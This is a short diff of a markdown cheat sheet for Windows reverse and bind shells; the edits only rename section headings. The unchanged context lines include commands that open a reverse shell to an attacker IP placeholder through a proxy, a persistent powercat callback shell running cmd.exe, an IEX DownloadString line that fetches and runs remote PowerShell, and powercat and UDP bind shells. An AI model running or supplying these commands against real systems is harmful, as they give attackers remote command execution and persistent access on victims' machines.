@@ -88,7 +88,7 @@ Connection through manually specified proxy
 PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT> -ProxyName <HTTP_proxy_IP> -ProxyPort <HTTP_proxy_PORT>
 ```
 
-#### 03 - Generate via `powercat`
+#### 03 - `powercat`
 
 Generate reverse shell.
 
@@ -108,7 +108,7 @@ Persist callback shell.
 > powercat -c <IP> -p <PORT> -e cmd.exe -rep
 ```
 
-#### 04 - Generate a payload via `msfvenom`
+#### 04 - `msfvenom`
 
 ##### 4.1 - x86 (32-bit) Payloads
 
@@ -180,7 +180,7 @@ PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com
 Invoke-PowerShellUdp -Bind -Port <PORT>
 ```
 
-#### 02 - Generate via `powercat`
+#### 02 - `powercat`
 
 Generate bind shell.
 
@@ -194,7 +194,7 @@ Generate encoded bind shell.
 > powercat -l -p <PORT> -e cmd.exe -ge
 ```
 
-#### 03 - Generate a payload via `msfvenom`
+#### 03 - `msfvenom`
 
 ##### 3.1 - x86 (32-bit) Payloads
 
